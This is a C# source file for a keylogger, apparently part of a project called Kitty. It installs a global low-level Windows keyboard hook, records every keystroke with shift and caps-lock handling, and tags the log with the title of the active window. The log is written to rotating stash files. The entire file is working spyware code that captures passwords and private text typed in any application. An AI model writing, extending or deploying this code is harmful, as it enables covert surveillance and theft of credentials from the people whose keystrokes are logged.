using Kitty.Types.Stash;
using Kitty.Win32;
using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace Kitty.Core.Keylog
{
    public static class Keylogger
    {
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private const int WM_SYSKEYDOWN = 0x0104;

        private static IntPtr hookHandle = IntPtr.Zero;
        private static IntPtr oldHwnd = IntPtr.Zero;
        private static char[] wText = new char[500];
        private static bool shift = false;
        private static ITextFactory textFactory = null;
        private static ITextStash textStash = null;

        public static bool Hook(ITextFactory _textFactory)
        {
            hookHandle = Win32API.SetWindowsHookEx_(WH_KEYBOARD_LL, HookProc, IntPtr.Zero, 0);
            textFactory = _textFactory;
            return hookHandle != null && hookHandle != IntPtr.Zero;
        }

        public static void Unhook()
        {
            if (hookHandle != IntPtr.Zero)
            {
                Win32API.UnhookWindowsHookEx_(hookHandle);
            }
        }

        private static long HookProc(int ncode, UIntPtr wParam, IntPtr lParam)
        {
            if (ncode == 0)
                ProcessKeyboardHook(wParam, lParam);
            return Win32API.CallNextHookEx_(IntPtr.Zero, ncode, wParam, lParam);
        }

        private static void PrepareFile()
        {
            if (textStash == null)
            {
                textStash = textFactory.GenerateNew();
            }
            else if (textStash.IsFull)
            {
                textStash.Dispose();
                textStash = textFactory.GenerateNew();
            }
        }

        private static void ProcessKeyboardHook(UIntPtr wParam, IntPtr lParam)
        {
            KBDLLHOOKSTRUCT kbdt = (KBDLLHOOKSTRUCT)Marshal.PtrToStructure(lParam, typeof(KBDLLHOOKSTRUCT));

            uint wParam32 = wParam.ToUInt32();
            if (kbdt.vkCode == (int)Keys.LShiftKey || kbdt.vkCode == (int)Keys.RShiftKey)
            {
                shift = (wParam32 == WM_KEYDOWN);
            }

            if (wParam32 == WM_SYSKEYDOWN || wParam32 == WM_KEYDOWN)
            {
                PrepareFile();

                IntPtr newHwnd = Win32API.GetForegroundWindow_();
                if (oldHwnd != newHwnd || textStash.IsEmpty)
                {
                    string title = Win32API.GetWindowText(newHwnd);
                    textStash.Write(string.Format("{1}[{0}]{1}", title, Environment.NewLine));
                    oldHwnd = newHwnd;
                }

                bool caps = Win32API.GetKeyState_((int)Keys.Capital) < 0;

                switch (kbdt.vkCode)
                {
                    // number keys
                    case 0x30: textStash.Write(shift ? ")" : "0"); break;
                    case 0x31: textStash.Write(shift ? "!" : "1"); break;
                    case 0x32: textStash.Write(shift ? "@" : "2"); break;
                    case 0x33: textStash.Write(shift ? "#" : "3"); break;
                    case 0x34: textStash.Write(shift ? "$" : "4"); break;
                    case 0x35: textStash.Write(shift ? "%" : "5"); break;
                    case 0x36: textStash.Write(shift ? "^" : "6"); break;
                    case 0x37: textStash.Write(shift ? "&" : "7"); break;
                    case 0x38: textStash.Write(shift ? "*" : "8"); break;
                    case 0x39: textStash.Write(shift ? "(" : "9"); break;
                    // numpad keys
                    case 0x60: textStash.Write("0"); break;
                    case 0x61: textStash.Write("1"); break;
                    case 0x62: textStash.Write("2"); break;
                    case 0x63: textStash.Write("3"); break;
                    case 0x64: textStash.Write("4"); break;
                    case 0x65: textStash.Write("5"); break;
                    case 0x66: textStash.Write("6"); break;
                    case 0x67: textStash.Write("7"); break;
                    case 0x68: textStash.Write("8"); break;
                    case 0x69: textStash.Write("9"); break;

                    // character keys
                    case 0x41: textStash.Write(caps ? (shift ? "a" : "A") : (shift ? "A" : "a")); break;
                    case 0x42: textStash.Write(caps ? (shift ? "b" : "B") : (shift ? "B" : "b")); break;
                    case 0x43: textStash.Write(caps ? (shift ? "c" : "C") : (shift ? "C" : "c")); break;
                    case 0x44: textStash.Write(caps ? (shift ? "d" : "D") : (shift ? "D" : "d")); break;
                    case 0x45: textStash.Write(caps ? (shift ? "e" : "E") : (shift ? "E" : "e")); break;
                    case 0x46: textStash.Write(caps ? (shift ? "f" : "F") : (shift ? "F" : "f")); break;
                    case 0x47: textStash.Write(caps ? (shift ? "g" : "G") : (shift ? "G" : "g")); break;
                    case 0x48: textStash.Write(caps ? (shift ? "h" : "H") : (shift ? "H" : "h")); break;
                    case 0x49: textStash.Write(caps ? (shift ? "i" : "I") : (shift ? "I" : "i")); break;
                    case 0x4A: textStash.Write(caps ? (shift ? "j" : "J") : (shift ? "J" : "j")); break;
                    case 0x4B: textStash.Write(caps ? (shift ? "k" : "K") : (shift ? "K" : "k")); break;
                    case 0x4C: textStash.Write(caps ? (shift ? "l" : "L") : (shift ? "L" : "l")); break;
                    case 0x4D: textStash.Write(caps ? (shift ? "m" : "M") : (shift ? "M" : "m")); break;
                    case 0x4E: textStash.Write(caps ? (shift ? "n" : "N") : (shift ? "N" : "n")); break;
                    case 0x4F: textStash.Write(caps ? (shift ? "o" : "O") : (shift ? "O" : "o")); break;
                    case 0x50: textStash.Write(caps ? (shift ? "p" : "P") : (shift ? "P" : "p")); break;
                    case 0x51: textStash.Write(caps ? (shift ? "q" : "Q") : (shift ? "Q" : "q")); break;
                    case 0x52: textStash.Write(caps ? (shift ? "r" : "R") : (shift ? "R" : "r")); break;
                    case 0x53: textStash.Write(caps ? (shift ? "s" : "S") : (shift ? "S" : "s")); break;
                    case 0x54: textStash.Write(caps ? (shift ? "t" : "T") : (shift ? "T" : "t")); break;
                    case 0x55: textStash.Write(caps ? (shift ? "u" : "U") : (shift ? "U" : "u")); break;
                    case 0x56: textStash.Write(caps ? (shift ? "v" : "V") : (shift ? "V" : "v")); break;
                    case 0x57: textStash.Write(caps ? (shift ? "w" : "W") : (shift ? "W" : "w")); break;
                    case 0x58: textStash.Write(caps ? (shift ? "x" : "X") : (shift ? "X" : "x")); break;
                    case 0x59: textStash.Write(caps ? (shift ? "y" : "Y") : (shift ? "Y" : "y")); break;
                    case 0x5A: textStash.Write(caps ? (shift ? "z" : "Z") : (shift ? "Z" : "z")); break;

                    // special keys
                    case (int)Keys.Space: textStash.Write(" "); break;
                    case (int)Keys.Enter: textStash.Write("\n"); break;
                    case (int)Keys.Tab: textStash.Write("\t"); break;
                    case (int)Keys.Escape: textStash.Write("[ESC]"); break;
                    case (int)Keys.Left: textStash.Write("[LEFT]"); break;
                    case (int)Keys.Right: textStash.Write("[RIGHT]"); break;
                    case (int)Keys.Up: textStash.Write("[UP]"); break;
                    case (int)Keys.Down: textStash.Write("[DOWN]"); break;
                    case (int)Keys.End: textStash.Write("[END]"); break;
                    case (int)Keys.Home: textStash.Write("[HOME]"); break;
                    case (int)Keys.Delete: textStash.Write("[DEL]"); break;
                    case (int)Keys.Back: textStash.Write("[BACK]"); break;
                    case (int)Keys.Insert: textStash.Write("[INS]"); break;
                    case (int)Keys.LControlKey:
                    case (int)Keys.RControlKey: textStash.Write("[CTRL]"); break;
                    case (int)Keys.LMenu:
                    case (int)Keys.RMenu: textStash.Write("[ALT]"); break;
                    case (int)Keys.F1: textStash.Write("[F1]"); break;
                    case (int)Keys.F2: textStash.Write("[F2]"); break;
                    case (int)Keys.F3: textStash.Write("[F3]"); break;
                    case (int)Keys.F4: textStash.Write("[F4]"); break;
                    case (int)Keys.F5: textStash.Write("[F5]"); break;
                    case (int)Keys.F6: textStash.Write("[F6]"); break;
                    case (int)Keys.F7: textStash.Write("[F7]"); break;
                    case (int)Keys.F8: textStash.Write("[F8]"); break;
                    case (int)Keys.F9: textStash.Write("[F9]"); break;
                    case (int)Keys.F10: textStash.Write("[F10]"); break;
                    case (int)Keys.F11: textStash.Write("[F11]"); break;
                    case (int)Keys.F12: textStash.Write("[F12]"); break;

                    // symbol keys
                    case (int)Keys.Oem1: textStash.Write(shift ? ":" : ";"); break;
                    case (int)Keys.Oem2: textStash.Write(shift ? "?" : "/"); break;
                    case (int)Keys.Oem3: textStash.Write(shift ? "~" : "`"); break;
                    case (int)Keys.Oem4: textStash.Write(shift ? "{" : "["); break;
                    case (int)Keys.Oem5: textStash.Write(shift ? "|" : "\\"); break;
                    case (int)Keys.Oem6: textStash.Write(shift ? "}" : "]"); break;
                    case (int)Keys.Oem7: textStash.Write(shift ? "\"" : "'"); break;
                    case (int)Keys.Oemplus: textStash.Write(shift ? "+" : "="); break;
                    case (int)Keys.Oemcomma: textStash.Write(shift ? "<" : ","); break;
                    case (int)Keys.OemMinus: textStash.Write(shift ? "_" : "-"); break;
                    case (int)Keys.OemPeriod: textStash.Write(shift ? ">" : "."); break;
                    // unknown keys
                    default:
                        long _lparam = (kbdt.scanCode << 16) | ((uint)kbdt.flags << 24);
                        string key = Win32API.GetKeyNameText((int)_lparam);
                        textStash.Write(key);
                        break;
                }
            }
        }
    }
}
